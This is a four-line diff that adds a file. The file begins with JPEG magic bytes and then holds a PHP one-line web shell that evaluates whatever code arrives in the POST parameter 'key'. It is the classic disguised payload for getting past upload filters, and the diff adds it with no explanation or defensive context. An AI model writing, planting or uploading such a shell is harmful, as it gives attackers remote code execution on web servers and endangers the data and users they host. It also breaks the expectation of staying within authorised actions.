@@ -1,0 +1,4 @@
+FF D8 FF
+<?php 
+    @eval($_POST["key"]);
+?>
